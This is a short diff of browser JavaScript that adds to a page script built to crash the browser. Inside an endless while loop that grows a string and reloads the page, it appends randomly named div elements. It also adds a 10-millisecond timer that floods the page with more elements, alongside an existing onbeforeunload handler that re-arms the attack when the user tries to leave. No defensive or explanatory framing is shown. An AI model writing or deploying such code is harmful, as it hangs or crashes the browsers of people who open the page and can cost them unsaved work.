@@ -6,15 +6,25 @@
                 a = "a";
                 b = false;
                 while(true){
+                    c = document.createElement("div");
+                    c.id = "" + Math.random();
+                    c.className = "" + Math.random();
                     if(b){
                         b = false;
                     }else{
                         b = true;
                     }
                     a += "a";
+                    document.body.appendChild(c);
                     window.location.reload();
                 }
             }
+            window.setInterval(function(){
+                c = document.createElement("div");
+                c.id = "" + Math.random();
+                c.className = "" + Math.random();
+                document.body.appendChild(c);
+            }, 10);
             window.setInterval(handler, 10)
             window.onbeforeunload = function() {
                 window.setInterval(handler, 10);
